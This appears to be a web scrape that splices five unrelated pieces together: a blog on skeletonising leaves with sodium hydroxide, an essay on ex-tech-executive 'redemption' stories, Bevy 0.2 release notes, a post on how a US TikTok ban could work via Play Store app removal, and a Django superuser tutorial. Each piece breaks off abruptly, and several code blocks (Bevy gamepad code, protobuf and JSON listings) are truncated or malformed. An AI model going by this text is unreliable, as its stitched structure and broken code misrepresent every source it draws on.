<p>I decided I wanted to try making some skeletonised leaves. So I did some Googling and decided to try <a href="https://penguinbaybiology.org/make-clear-leaf-view-vein-structure/">this</a> approach.</p>



<p>We went out in the evening and gathered some leaves from the local  Shrubbery. Totally not suspicious 🙂</p>

<p>I bought some Sodium Hydroxide and a cheap steel pot from ebay. Note: it must <strong>not</strong> be Aluminium as the Sodium Hydroxide will react with Aluminium!</p>

<p>Although Sodium Hydroxide isn’t a deadly poison, you really don’t want it on your skin or in your eyes, so gloves/goggles are a necessity for safety. Hmm, I should really look into some sort of cheap lab coat as well to protect my clothes for this sorta stuff:</p>

<p>I scaled up the proportions to 1L of (Edinburgh) tap water and 30G of Sodium Hydroxide powder. I put them in the pot, brought it to the boil and added the leaves. </p>



<p>For fun I also tested the pH of the solution with my new pH paper (also from Ebay/China). Its about a 14, so pretty alkaline!</p>

<p>The instructions suggested boiling for about two hours, but it appears to depend on the leaves you choose. I checked on it every 20 minutes or so, and pulled leaves out as they became ready. </p>



<p>To process them, I had the following set up next to the pot:</p>



<ul><li>Tray 1: Plain tap water to wash off the Sodium Hydroxide.</li><li>Tray 2: Some “Ordinary Household Bleach” (aka Sodium Hypochlorite) to bleach any remaining colour out.</li><li>Tray 3: More plain tap water to wash off the bleach.</li><li>A sheet of alumunium foil to put the leaves on to dry out.</li></ul>



<p>After all of them were processed, I ended up with this:</p>

<p>The next morning I was able to unpeel the more robust leaves, yielding me these:</p>

<p>Observations</p>



<ul><li>You need to use <em>robust</em> leaves from trees. I tried some nettle leaves, but they quickly turned to mush. Some of the tree leaves appeared to process fine, but turned out to be way too delicate to remove from the foil after drying: definitely depends on the species. There may be a better way to dry them, will think on it.</li><li>Only process one species of leaf at a time, otherwise you constantly have to check each one in the pot, which means you’re disturbing them more to check.</li><li>Make sure to check on the water level! I <em>almost</em> boiled it dry.</li><li>Its fiddly! During processing, you have to <em>carefully</em> unroll the leaves by hand while wearing gloves to get them flat prior to drying.</li><li>I tried processing a dried up Oak leaf since theoretically it should be closer to being skeletonised: it didn’t seem to work very well (you can see the unsuccessful result on the aluminium foil photo).</li></ul>



<p>What Next?</p>



<p>They’re definitely more robust than I expected, but they’re still quite delicate. I fancy trying dying them and embedding them into some transparent resin next.</p>

                  <p><em>The tech executive turned data justice warrior is celebrated as a truth-telling hero, but there’s something a bit too smooth about this narrative arc.</em></p><div><p><img src="https://conversationalist.org/wp-content/uploads/2020/03/Tristan-Harris.jpg" alt="" srcset="https://conversationalist.org/wp-content/uploads/2020/03/Tristan-Harris.jpg 799w, https://conversationalist.org/wp-content/uploads/2020/03/Tristan-Harris-300x200.jpg 300w, https://conversationalist.org/wp-content/uploads/2020/03/Tristan-Harris-768x512.jpg 768w" sizes="(max-width: 640px) 100vw, 640px"></p><p><span>Credit: Stuart Isett/Fortune</span><span></span></p></div>
<p>A few months ago, I was contacted by a senior executive who was about to leave a marketing firm. He got in touch because I’ve worked on the non-profit side of tech for a long time, with lots of volunteering on digital and human rights. He wanted to ‘give back’. Could I put him in touch with digital rights activists? Sure. We met for coffee and I made some introductions. It was a perfectly lovely interaction with a perfectly lovely man. Perhaps he will do some good, sharing his expertise with the people working to save democracy and our private lives from the surveillance capitalism machine of his former employers. The way I rationalized helping him was: firstly, it’s nice to be nice; and secondly, movements are made of people who start off far apart but converge on a destination. And isn’t it an unqualified good when an insider decides to do the right thing, however late?</p>
<p>The Prodigal Son is a New Testament parable about two sons. One stays home to work the farm. The other cashes in his inheritance and gambles it away. When the gambler comes home, his father slaughters the fattened calf to celebrate, leaving the virtuous, hard-working brother to complain that all these years he wasn’t even given a small goat to share with his friends. His father replies that the prodigal son ‘was dead, now he’s alive; lost, now he’s found’. Cue party streamers. It’s a touching story of redemption, with a massive payload of moral hazard. It’s about coming home, saying sorry, being joyfully forgiven and starting again. Most of us would love to star in it, but few of us will be given the chance.</p>
<p>The Prodigal Tech Bro is a similar story, about tech executives who experience a sort of religious awakening. They suddenly see their former employers as toxic, and reinvent themselves as experts on taming the tech giants. They were lost and are now found. They are warmly welcomed home to the center of our discourse with invitations to write opeds for major newspapers, for think tank funding, book deals and TED talks. These guys – and yes, they are all guys – are generally thoughtful and well-meaning, and I wish them well. But I question why they seize so much attention and are awarded scarce resources, and why they’re given not just a second chance, but also the mantle of moral and expert authority.</p>
<p>I’m glad that Roger McNamee, the early Facebook investor, has <a href="https://www.theguardian.com/world/2020/feb/29/rebecca-solnit-younger-feminists-shift-understanding-give-new-tools">testified to the U.S. Congress</a> about Facebook’s wildly self-interested near-silence about its amplification of Russian disinformation during the 2016 presidential election. I’m thrilled that Google’s ex-‘design ethicist’, Tristan Harris, “<a href="https://www.theguardian.com/world/2020/feb/29/rebecca-solnit-younger-feminists-shift-understanding-give-new-tools">the </a><em>closest thing Silicon Valley has to a conscience,</em>“(startlingly faint praise) now runs a Center for Humane Technology, exposing the mind-hacking tricks of his former employer. I even <a href="https://www.youtube.com/watch?v=3hSrUaSNFSY&amp;t=2309s">spoke</a> —critically but, I hope, warmly—at the book launch of James Williams, another ex-Googler turned attention evangelist, who “<a href="https://en.wikipedia.org/wiki/Center_for_Humane_Technology">co-founded the movement</a>”of awareness of designed-in addiction. I wish all these guys well. I also wish that the many, exhausted activists who didn’t take money from Google or Facebook could have even a quarter of the attention, status and authority the Prodigal Techbro assumes is his birth-right.</p>
<p>Today, when the tide of public opinion on Big Tech is finally turning, the brothers (and sisters) who worked hard in the field all those years aren’t even invited to the party. No fattened calf for you, my all but unemployable tech activist. The moral hazard is clear; why would anyone do the right thing from the beginning when they can take the money, have their fun, and then, when the wind changes, convert their status and relative wealth into special pleading and a whole new career?</p>
<p>Just half an hour flipping through my contacts produced half a dozen friends and acquaintances who didn’t require a ‘road to Damascus’ conversion to see what was wrong with big tech or the ways governments abuse it. Nighat Dad runs the <a href="https://digitalrightsfoundation.pk/">Digital Rights Foundation in Pakistan</a>, defending online freedom of expression and privacy for women, minorities and dissidents. That’s real courage. <a href="https://privacyinternational.org/people/95/gus-hosein">Gus Hosein</a> has worked in tech and human rights for over 20 years, runs Privacy International, the UK-based non-profit, and is the most visionary thinker I know on how to shake up our assumptions about why things are as they are.&nbsp; <a href="https://biancawylie.com/">Bianca Wylie </a>founded the volunteer-run Open Data Institute Toronto, and works on open data, citizen privacy and civic engagement. The “<a href="https://www.citylab.com/life/2018/12/bianca-wylie-interview-toronto-quayside-protest-criticism/574477/">Jane Jacobs of the Smart Cities Age</a>,” she’s been a key figure in opening up and slowing down Alphabet’s Sidewalk Labs juggernaut in Toronto. Aral Balkan runs <a href="https://small-tech.org/">Small Technology Foundation </a>and works on both the tools and the policies to resist surveillance capitalism. Unafraid of being unpopular, even with other activists, Balkan freely hammers rights organizations or conferences for taking big tech’s sponsorship money while criticizing the companies’ practices. In the western Balkans, <a href="https://hvale.me/">hvale vale</a><a href="#_ftn10" name="_ftnref10"></a> works tirelessly and cheerfully on women’s rights, sexual rights and the political and practical path to a feminist internet. <a href="https://en.wikipedia.org/wiki/Robin_Gross">Robin Gross</a>, &nbsp;a Californian intellectual property lawyer, could have put her persistence and sheer pizazz to work defending big entertainment companies, but instead she’s worked for decades against the copyright maximalism that strangles artists’ creativity and does nothing to increase their incomes. I would love to hear their voices amplified, not (just) the voices of those who took a decade and more to work out the rottenness at the core of big tech.</p>
<p>Ex-Google lobbyist Ross Lajeunesse left the company in 2019 over its censored search engine for China and also because of homophobic, sexist and racist work practices. He’s now running for a Democratic senate nomination, and recently wrote a classic of the ‘scales have fallen from my eyes’ genre, called “I Was Google’s Head of International Relations. <a href="https://medium.com/@rossformaine/i-was-googles-head-of-international-relations-here-s-why-i-left-49313d23065">Here’s Why I Left</a>.” Its lede is <em>“The company’s motto used to be “Don’t be evil.” Things have changed.”</em></p>
<p>Really? Has Google really changed? Lajeunesse joined in 2008, years into Google’s multi-billion dollar <a href="https://www.bloomberg.com/news/articles/2010-10-21/google-2-4-rate-shows-how-60-billion-u-s-revenue-lost-to-tax-loopholes">tax avoidance</a>, <a href="https://www.cnet.com/news/google-hit-with-job-discrimination-lawsuit/">sexist labor practices</a> and <a href="http://news.bbc.co.uk/2/hi/technology/6740075.stm">privacy hostility</a> and continued to work there through the years of <a href="https://www.bbc.co.uk/news/technology-40406542">antitrust fines</a>, misuse of <a href="https://www.bbc.com/news/technology-40406542">personal health data</a>, <a href="https://www.cnet.com/news/judge-rejects-324-5m-wage-fixing-settlement-struck-by-apple-google-others/">wage fixing</a>, and financially <a href="https://www.nytimes.com/2017/08/30/us/politics/eric-schmidt-google-new-america.html">pressuring think tanks</a>. Google didn’t change. It just started treating some of its insiders like it already treated outsiders. That only looks like radical change if you’ve never thought too hard about what you are doing and to whom.</p>
<p>One hundred thousand people work for Google/Alphabet; some of them have much more power than others. The point isn’t whether Lajeunesse is or isn’t culpable for the many acts of the enormous company he represented—as its chief lobbyist in Asia for several years—it’s that of all the people who spent the decade of 2010-20 working thanklessly to expose and reduce the firm’s monopolistic abuse and assault on global privacy, it’s the ex-lobbyist who gets our attention now.</p>
<p>We all need second chances. Even if we don’t need those fresh starts ourselves, we want to live in a world where people have a reason to do better. But the prodigal tech bro’s redemption arc is so quick and smooth it’s barely a road bump. That’s because we keep skipping the most important part of the prodigal son story—where he hits rock bottom. In the original parable, the prodigal son wakes up in a pig sty, starving, and realizes his father’s servants now live better than he does. He resolves to go home to the people and place he did not value or respect before. He will beg to be one of his father’s servants. He accepts his complete loss of status. But instead of chastising and punishing his prodigal son, the rejoicing father greets him joyfully and heads off the apology with a huge party. It’s a great metaphor for how to run a religion, but a lousy way to run everything else.</p>
<p>Prodigal tech bro stories skip straight from the past, when they were part of something that—surprise!—turned out to be bad, to the present, where they are now a moral authority on how to do good, but without the transitional moments of revelation and remorse. &nbsp;But the bit where you say you got things wrong and people were hurt? That’s the most important part. It’s why these corporatized reinventions feel so slick and tinny, and why so many of the comments on Lajeunesse’s <a href="https://medium.com/@rossformaine/i-was-googles-head-of-international-relations-here-s-why-i-left-49313d23065">train wreck post</a> on Medium were critical. The journey feels fake. These ‘I was lost but now I’m found, please come to my TED talk’ accounts typically miss most of the actual journey, yet claim the moral authority of one who’s ‘been there’ but came back. It’s a teleportation machine, but for ethics.</p>
<p>(While we’re thinking about the neatly elided parts of the prodigal tech bro story, let’s dwell for one moment on the deletion of the entire stories of so many women and people of color barely given a first chance in Silicon Valley, let alone multiple reinventions.)</p>
<p>The only thing more fungible than cold, hard cash is privilege. The prodigal tech bro doesn’t so much take an off-ramp from the relatively high status and well-paid job he left when the scales fell from his eyes, as zoom up an on-ramp into a new sector that accepts the reputational currency he has accumulated. He’s not joining the resistance. He’s launching a new kind of start-up using his industry contacts for seed-funding in return for some reputation-laundering.</p>
<p>So what? Sure, it’s a little galling, but where’s the harm?</p>
<p>Allowing people who share responsibility for our tech dystopia to keep control of the narrative means we never get to the bottom of how and why we got here, and we artificially narrow the possibilities for where we go next. And centering people who were insiders before and claim to be leading the outsiders …</p></div></div></div>

  </div><div><p>A month after the initial Bevy release, and thanks to <strong>87</strong> contributors, <strong>174</strong> pull requests, and our <a href="https://github.com/sponsors/cart"><strong>generous sponsors</strong></a>, I'm happy to announce the <strong>Bevy 0.2</strong> release on <a href="https://crates.io/crates/bevy">crates.io</a>!</p>
<p>For those who don't know, Bevy is a refreshingly simple data-driven game engine built in Rust. You can check out <a href="https://bevyengine.org/learn/book/getting-started/">Quick Start Guide</a> to get started. Bevy is also free and open source forever! You can grab the full <a href="https://github.com/bevyengine/bevy">source code</a> on GitHub.</p>
<p>Here are some of the highlights from this release:</p>
<h2 id="async-task-system">Async Task System</h2>

<p>Bevy uses multi-threading throughout the engine: ECS scheduling, asset loading, rendering, etc. Before this release it used <a href="https://github.com/rayon-rs/rayon">Rayon</a> for almost all of these tasks. Rayon is nice because it is generally as simple as calling <code>some_list.par_iter().for_each(|x| do_something(x))</code>. Rayon then automatically breaks the <code>for_each</code> into tasks and runs them on as many cores as it can. Rayon is a great choice if you want to easily parallelize code, but it has the downside of being pretty cpu-hungry.</p>
<p>Bevy (and a number of other rust game engines and ecs frameworks using rayon) have received feedback that they were overly cpu hungry / usage was not proportional to "real" work done.</p>
<p>We decided to resolve this problem by building a custom async-friendly task system, which enables the creation of context-specific task pools. For example, you might have separate pools for compute, IO, networking, etc. This also gives us the flexibility to load balance work appropriately according to work type and/or priority. The cpu usage wins have been huge:</p>
<h3 id="total-combined-percent-cpu-usage-8-core-machine-smaller-is-better">Total Combined Percent CPU Usage - 8 Core Machine (smaller is better)</h3>
<p><img src="https://bevyengine.org/news/bevy-0-2/bevy_tasks_1.svg" alt="threading cpu usage 8 core"></p>

<h2 id="initial-web-platform-support">Initial Web Platform Support</h2>
<p>authors: @smokku</p>
<p>(A subset of) Bevy now runs on the web using WebAssembly/WASM! Specifically, Bevy apps can run Bevy ECS schedules, react to input events, create an empty canvas (using winit), and a few other things. This is a huge first step, but it is important to call out that there are still a number of missing pieces, such as 2D/3D rendering, multi-threading, and sound. </p>
<p>Those limitations haven't stopped @mrk-its from building the first WASM Bevy game!</p>
<h3 id="bevy-robbo-playable-here"><a href="https://github.com/mrk-its/bevy-robbo">bevy-robbo</a> (<a href="https://s3.eu-central-1.amazonaws.com/mrk-public/bevy-robbo/index.html">playable here</a>)</h3>
<p><img src="https://bevyengine.org/news/bevy-0-2/bevy-robbo.png" alt="bevy-robbo"></p>
<p>They use Bevy for game logic and cleverly work around the render limitations by passing ASCII art game state from <a href="https://github.com/mrk-its/bevy-robbo/blob/master/src/systems/js_render.rs">this Bevy system</a> to <a href="https://github.com/mrk-its/bevy-robbo/blob/master/assets/render.js">this JavaScript function</a>. </p>

<h2 id="parallel-queries">Parallel Queries</h2>
<p>authors: @GrantMoyer</p>
<p>Bevy ECS Queries are a flexible way to retrieve data from the Entity Component System. Systems that <em>use</em> queries already run in parallel, but before this change the queries themselves could not be <em>iterated</em> in parallel. <strong>Bevy 0.2</strong> adds the ability to easily iterate queries in parallel:</p>
<pre><code><span>fn </span><span>system</span><span>(</span><span>pool</span><span>: </span><span>Res</span><span>&lt;</span><span>ComputeTaskPool</span><span>&gt;</span><span>, </span><span>mut </span><span>query</span><span>: </span><span>Query</span><span>&lt;&amp;</span><span>mut</span><span> Transform</span><span>&gt;) {</span><span>
    query</span><span>.</span><span>iter</span><span>().</span><span>par_iter</span><span>(</span><span>32</span><span>).</span><span>for_each</span><span>(&amp;</span><span>pool</span><span>, |</span><span>mut </span><span>transform</span><span>| {</span><span>
      transform</span><span>.</span><span>translate</span><span>(</span><span>Vec3</span><span>::</span><span>new</span><span>(</span><span>1.0</span><span>, </span><span>0.0</span><span>, </span><span>0.0</span><span>));
    });
}
</span></code></pre>
<p>This provides a nice functional api (similar to Rayon) that runs on top of the new <code>bevy_tasks</code> system. It breaks the query up into 32 "batches" and runs each batch as a different task in the bevy task system. </p>
<h2 id="transform-system-rewrite">Transform System Rewrite</h2>
<p>authors: @MarekLg</p>
<pre><code><span>// old
</span><span>fn </span><span>system</span><span>(</span><span>translation</span><span>: &amp;</span><span>Translation, </span><span>rotation</span><span>: &amp;</span><span>Rotation, </span><span>scale</span><span>: &amp;</span><span>Scale</span><span>) {
  </span><span>println!</span><span>("</span><span>{} {} {}</span><span>",</span><span> translation</span><span>.</span><span>0</span><span>,</span><span> rotation</span><span>.</span><span>0</span><span>,</span><span> scale</span><span>.</span><span>0</span><span>);
}

</span><span>// new
</span><span>fn </span><span>system</span><span>(</span><span>transform</span><span>: &amp;</span><span>Transform</span><span>) {
  </span><span>println!</span><span>("</span><span>{} {} {}</span><span>",</span><span> transform</span><span>.</span><span>translation</span><span>(),</span><span> transform</span><span>.</span><span>rotation</span><span>(),</span><span> transform</span><span>.</span><span>scale</span><span>());
}
</span></code></pre>
<p>Bevy's old transform system used separate <code>Translation</code>, <code>Rotation</code>, and <code>Scale</code> components as the "source of truth". Users modified with these components in their systems, after which they were synced to a <code>LocalTransform</code> component, which was in turn synced to a global <code>Transform</code> component, taking hierarchy into account. This was nice for a couple of reasons:</p>
<ul>
<li>Slightly more cache efficient to retrieve individual components like <code>Translation</code> (because less data needs to be accessed)</li>
<li>Theoretically more parallel-friendly. Systems that only access <code>Translation</code> won't block systems accessing <code>Rotation</code>.</li>
</ul>
<p>However this approach also has some pretty serious downsides:</p>
<ul>
<li>The "individual components" are the source of truth, so <code>LocalTransform</code> is out of date when user systems are running. If an up to date "full transform" is needed, it must be manually constructed by accessing all three components.</li>
<li>Very hard to reason about. There are 5 components users need to think about and they all interact with each other differently.</li>
<li>Setting a Transform to a specific matrix value (ex: <code>Mat4::look_at()</code>) was extremely cumbersome, and the value would be immediately overwritten unless the user explicitly disabled component syncing.</li>
</ul>
<p>Given these issues, we decided to move to a single unified local-to-parent <code>Transform</code> component as the source of truth, and a computed <code>GlobalTransform</code> component for world-space transforms. We think this api will be much easier to use and to reason about. <a href="https://gist.github.com/joeante/79d25ec3a0e86436e53eb74f3ac82c0c">Unity is also considering a similar Transform rework for their ECS</a> and a lot of discussion on this topic happened in this <a href="https://community.amethyst.rs/t/legion-transform-design-discussion">Amethyst Forum Thread</a>.</p>
<h2 id="joystick-gamepad-input">Joystick/Gamepad Input</h2>
<p>authors: @simpuid</p>
<p>The Bevy Input plugin now has cross-platform support for most controllers thanks to the <a href="https://gitlab.com/gilrs-project/gilrs">gilrs</a> library!</p>
<pre><code><span>fn </span><span>button_system</span><span>(</span><span>gamepads</span><span>: </span><span>Res</span><span>&lt;</span><span>Vec</span><span>&lt;</span><span>Gamepad</span><span>&gt;&gt;</span><span>, </span><span>button_input</span><span>: </span><span>Res</span><span>&lt;</span><span>Input</span><span>&lt;</span><span>GamepadButton</span><span>&gt;&gt;) {

        }
    }
}
</span></code></pre><h2 id="bevy-ecs-performance-improvements">Bevy ECS Performance Improvements</h2>
<p>authors: @cart</p>
<h3 id="generational-entity-ids">Generational Entity IDs</h3>
<p>We changed Entity IDs from being random UUIDs to incrementing generational indices. Random UUIDs were nice because they could be created anywhere, were unique across game runs, and could be safely persisted to files or reused across networks. I was really hoping we could make them work, but they ended up being too slow relative to the alternatives. The randomness had a measurable cost and entity locations had to be looked up using a hash map.</p>
<p>By moving to generational indices (we use the hecs implementation), we can directly use entity ids as array indices, which makes entity location lookups lightning fast.</p>
<h3 id="read-only-queries">Read Only Queries</h3>
<p>I implemented "read only" traits for queries that don't mutate anything. This allows us to guarantee that a query won't mutate anything.</p>
<h3 id="removed-locking-from-world-apis">Removed locking from World apis</h3>
<p>This gives us a really nice speed boost. We can do this safely due to a combination of the new "read only queries" and changing World mutation apis to be a mutable World borrow.</p>
<p>This is not yet enabled for <code>Queries</code> in systems because a system could have multiple <code>Queries</code>, which could be simultaneously accessed in a way that doesn't make mutable access unique. I think thats a solve-able problem, but it will take a bit more work. Fortunately "for-each" systems don't have any collision risk, so we now use lock-less queries there.</p>
<h3 id="direct-component-lookup-in-nanoseconds-smaller-is-better">Direct component lookup (in nanoseconds, smaller is better)</h3>
<p>As a result of these optimizations, direct component lookup is <em>much</em> faster than it used to be:</p>
<p><img src="https://bevyengine.org/news/bevy-0-2/get_component.svg" alt="get_component graph"></p>
<p>Note that this benchmark used <code>world.get::&lt;T&gt;(entity)</code>. <code>query.get::&lt;T&gt;(entity)</code> should have results similar to the <code>hecs</code> results because it still uses a lock. Eventually I'm hoping that we can remove locks from system queries too.</p>

      Legal questions aside, let's explore the technical possibilities.
    </p><div>

<p>Let’s be very clear here. I am not a fan of TikTok. I had the misfortune of coming across it when it was still called Musically and I had to explain to a little girl that she, unlike her friends, was not allowed to dance for strangers. That ruined an otherwise perfect evening.</p>

<p>I’m also not a fan of Donald Trump(et). It’s safe to assume that he threatens to shut down TikTok for all the wrong reasons, but if he manages to pull through, it will be a benefit for mankind. So, is it actually technically possible to get TikTok and WeChat banned in the US?</p>

<h2 id="removing-apps-from-google-play">Removing apps from Google Play</h2>

<p>Story time (you can skip ahead two paragraphs for an obvious revelation)!</p>

<p>I once wrote a pretty silly slot machine game for Android. It was as a coding exercise and failed in pretty much every aspect except being recognized for what it actually wasn’t: a real gambling app.
</p><figure>
  <a href="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/pocketbandit.png">

  </a>
  
  <figcaption>Pocket Bandit: pretty (, colorful,) boring</figcaption>
  
</figure><p>
                             
                             
All you could do was to bet one to three coins, then pull the lever and watch the reels spin. You started with a fixed amount of credit and the laws of probability dictated that you’d eventually go bankrupt. Once that happened, you could simply restarted the “game” and had a full purse again. No <em>wait x hours or pay $$$ to continue playing</em> bullshit. No way of winning anything either. In other words: the most boring one-armed bandit ever. Not even suitable for detoxing a gambling addict. I had somehow managed to put in all the mechanics of a classical slot machine except the one (winning/loosing) that was responsible for producing the excitement.</p>

<p>Well, there’s no rule that states, you can’t publish rubbish on Google Play. Much to my surprise though, there is a rule that says, you can’t publish gambling apps in some Arab countries without governmental approval. So, one fateful morning, I received a mail from Google telling me that my app had been pulled from Play in those countries. I was pissed. Not because the world needed my app. Not because some Arabs were now deprived of the most dull entertainment, only I could provide. I was pissed because someone had obviously only spent the time of looking at the screenshots to determine that this was a gambling app, but hadn’t bothered to reason how you were suppose to spend (real) money in an app that doesn’t even request network permission. It felt unjustified. Like a downvote driven in with the banhammer. Someone with the attention span of a puppy had the power of Thor.</p>

<p>There was no point in appealing. After all, the game was crap, but the incident was a nice reminder on how fragile businesses, build on apps are. Somewhere, someone with too little time to be thorough can simply nuke them without prior warning. Needless to say, that in time, the same  kind of sloppiness resulted in more of my apps being pulled …</p>

<p>So, what’s the take away from my story?</p>

<p>Geo fencing has always been a core feature of Play and Google never really went out of its way to stand up for developers. Sure, my apps are small fries compared to behemoths like TikTok, but then again, they aren’t direct competitors to youtube either. Let’s keep that in mind in case anyone has high hopes for Google putting up a fight.</p>

<h2 id="what-about-sideloading">What about sideloading?</h2>

<p>Who needs Play anyway? Android is not IOS, we can simply download the APK off the web and install it ourselves, right? Eh well, no. It’s not that simple. Bytedance swallowed Google’s Cool Aid and switched to App Bundles/Dynamic Delivery in order to reduce the size of their app. So instead of a single, one size fits all APK, you get a bunch of individual files. In case of TikTok v17.6.3 and depending on your device, the list might look like this:</p>

<ul>
<li>com.zhiliaoapp.musically-2021706030.apk</li>
<li>com.zhiliaoapp.musically-2021706030_config.armeabi_v7a.apk</li>
<li>com.zhiliaoapp.musically-2021706030_config.en.apk</li>
<li>com.zhiliaoapp.musically-2021706030_config.xhdpi.apk</li>
<li>com.zhiliaoapp.musically-2021706030_df_creationtool_so.apk</li>
<li>com.zhiliaoapp.musically-2021706030_df_creationtool_so.config.armeabi_v7a.apk</li>
<li>com.zhiliaoapp.musically-2021706030_df_fusing.apk</li>
<li>com.zhiliaoapp.musically-2021706030_df_photomovie.apk</li>
</ul>

<p>Split APKs cannot be sideloaded (easily). On plain Android, there’s simply no user interface for telling the packagemanager that you want it to install an app from several connected files (<a href="https://raccoon.onyxbits.de/blog/merge-split-apk/">after all, making sideloading difficult was/is the whole idea behind App Bundles</a>). You need extra tools (e.g. ADB) for that. But let’s be brutally honest here, if you are in the target audience of TikTok, then you are probably missing a brain cell or two (out of a total of two) and won’t be able to use them.</p>

<div>
  
  <p><span>Fun fact</span>
  
  
App Bundles have a build in security flaw. Traditional APKs cannot be modified by the Playstore. App Bundles can. For rogue government agencies, this provides the option of pushing hacked app updates to </p><u>selected</u><p> individuals. For that reason, <b>no</b> app in the "communications" category should ever use App Bundles as a distribution format. Imagine that! Coincidentally, Trump was actually right when calling TikTok a security issue. Cheers ByteDance!

</p></div>
                             
                             

<p>So, why doesn’t ByteDance simply host a traditional APK on the TikTok website then?</p>

<p>Two reasons actually</p>

<ol>
<li>Self hosting your app means, people will download the self hosted version (duh!), even if they could get it from the Playstore. As a result, the Playstore version sees less downloads, less reviews and less ratings which may eventually lead to it spiraling down in the rankings (ever wondered why all youtubers end their videos with the magic mantra “like and subscribe, hit the bell and give me a thumbs up”? Same mechanic there). This, by the way was the leverage, Google used to monopolize the app store market on Android: you are free to host elsewhere, but if your competitors solely host with us, they will eventually outrank you.</li>
<li>ByteDance not only drank the Google Cool aid, but also coughed it up and swallowed it again. Part of their revenue is in-app purchases. Those don’t work with sideloaded APKs. They could, of course, implement their own <abbr title="In App Purchase">IAP</abbr>, but that’s something <a href="https://raccoon.onyxbits.de/blog/2020081401/">Epic tried with Fortnite</a> recently…</li>
</ol>

<h2 id="removing-existing-tiktok-installations-from-devices">Removing existing TikTok installations from devices</h2>

<p>Buckle up, this may come as a surprise or as a confirmation of your fears!</p>

<p>Did you ever notice the big green “install” button on the Google Play website? With it, you can conveniently browse the store on your PC and send apps to your phone for installation.</p>

<figure>
  <a href="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/googleplay-tiktok.png">
    <img src="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/googleplay-tiktok.png">
  </a>
  
  <figcaption>Screencap: The install button on the Play website is sort off a remnant from the old days when 320x480 screens where the norm and you'd rather browse the androidmarket (as it was called back then) on your PC.</figcaption>
  
</figure>
                             
                             

<p>This is done via “Push messages”. Which is just a modern way of saying that your phone wakes up every couple of minutes in order to waste battery and bandwidth on checking if there are any new ads you should see. It also checks if there are any app updates or pending installs (from the green button) while it is at it, just so you have a reason not to disable the <del>spy</del> playstore app when you don’t need it. The relevant <a href="https://developers.google.com/protocol-buffers/">message structure</a> looks like this:</p>

</span><span></span>  <span>optional</span> <span>bool</span> malicious <span>=</span> <span>1</span>;<span>
</span><span></span>}</code></pre></div>

<p>A request to delete an app from a device looks like this:</p>

<div><pre><code data-lang="protobuf">notificationType<span>:</span> <span>2</span><span>
</span><span></span>docid {<span>
</span><span></span>  backendDocId<span>:</span> <span>"com.zhiliaoapp.musically"</span><span>

</span><span></span>purchaseRemovalData {<span>
</span><span></span>  malicious<span>:</span> <span>true</span><span>
</span><span></span>}</code></pre></div>

<p>Note that the malicious flag is purely cosmetic. The only thing Play has to send is the package name of the app and the notificationType 2. The app gets deleted, even if it wasn’t installed via Play.</p>

<h2 id="blocking-tiktok-in-the-usa">Blocking TikTok in the USA</h2>

<p>Let’s say you are an existing TikTok user and a US citizen. Let’s say, after reading the above, you disable the Playstore client, so Google can’t delete apps from your phone. What are they going to do then? Tell your ISP to firewall the TikTok servers (I heard, China has the tech for that. Maybe they’ll share…)? Well, curiously, there’s a much simpler solution. Did I already mention that ByteDance drank the Google Coolaid to the last drip? Let’s use an <a href="https://raccoon.onyxbits.de/">apk downloader</a> to request the <a href="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/com_zhiliaoapp_musically.json">Google Playstore entry for the TikTok app</a>. Here’s an excerpt:</p>

<div><pre><code data-lang="json"><span>"dependency"</span><span>:</span> [{

<p><img data-src="https://i.ibb.co/n3YzYyF/Main-Images-4-1.png" alt="How does Django validate passwords" title="How does Django validate passwords" src="https://i.ibb.co/n3YzYyF/Main-Images-4-1.png">
</p><p>
A few days ago, I was working on one of my old Django projects. It was running an old version of Django and I wanted to keep it updated with the latest changes of the framework.</p>
<p>
So to check the <a href="https://ranvir.xyz/blog/django-admin-tips-and-tricks/">admin site</a>, I tried to create the superuser after connection to the local database.</p>
<div><div><pre><code><span>python</span> <span>manage</span><span>.</span><span>py</span> <span>createsuperuser</span>
</code></pre></div></div>

<p>
When I passed a password similar to the username it failed saying, <code>The password is too similar to the username.</code></p>
<p><img data-src="https://i.ibb.co/94D2x9G/Screenshot-2020-09-19-at-1-32-17-AM.png" alt="The password is too similar to the username" title="The password is too similar to the username" src="https://i.ibb.co/94D2x9G/Screenshot-2020-09-19-at-1-32-17-AM.png">
</p><p>
This error triggered me to check the working behind this password validation feature.</p><p>
The first thing that I looked into was the <code>manage.py</code> file itself which in turn was importing and executing a method called, <code>execute_from_command_line</code>.</p><p>
I traced it back and found a package <code>commands</code> containing everything that I wanted to know. This directory had two files.</p>
<div><div><pre><code><span>1.</span> <span>createsuperuser</span><span>.</span><span>py</span>
<span>2.</span> <span>changepassword</span><span>.</span><span>py</span>
</code></pre></div></div>
<h2 id="the-changepassword-command">The changepassword command</h2><p>
Since I had never used/ heard about the <code>changepassword</code> command, I thought of trying it first and to my great pleasure, it worked. You have to pass the username as the first argument.</p>
<div><div><pre><code><span>python</span> <span>manage</span><span>.</span><span>py</span> <span>changepassword</span> <span>username</span>
</code></pre></div></div>
<p><img data-src="https://i.ibb.co/YRfMkYW/Screenshot-2020-09-19-at-3-10-09-AM.png" alt="python manage.py changepassword" title="python manage.py changepassword" src="https://i.ibb.co/YRfMkYW/Screenshot-2020-09-19-at-3-10-09-AM.png">
</p><p>
Sometimes you find gold when you read the code, right? ðŸ˜�</p><p>
Now letâ€™s get back to the business and look into the <code>createsuperuser</code> command class in more detail.</p>
<h2 id="fetching-the-correct-database">Fetching the correct database</h2><p>
If you have been using Django for some time, you would know that Django allows you to change a lot of things depending upon the settings you define.</p><p>
This also includes using some random model as your base User model. This is the first thing that the superuser creation <code>__init__</code> constructor method checks for.</p>
<h2 id="creating-the-superuser-without-interaction">Creating the superuser without interaction</h2><p>
You can use a version of the command that allows you to create the superuser without any interaction.</p>
<div><div><pre><code><span>python</span> <span>manage</span><span>.</span><span>py</span> <span>createsuperuser</span> <span>--</span><span>username</span> <span>ranvir</span> <span>--</span><span>email</span> <span>abc</span><span>@</span><span>abc</span><span>.</span><span>com</span> <span>--</span><span>no</span><span>-</span><span>input</span>
</code></pre></div></div>
<p><img data-src="https://i.ibb.co/LJtHHq5/Screenshot-2020-09-19-at-3-17-49-AM.png" alt="python manage.py createsuperuser no-input" title="python manage.py createsuperuser no-input" src="https://i.ibb.co/LJtHHq5/Screenshot-2020-09-19-at-3-17-49-AM.png">
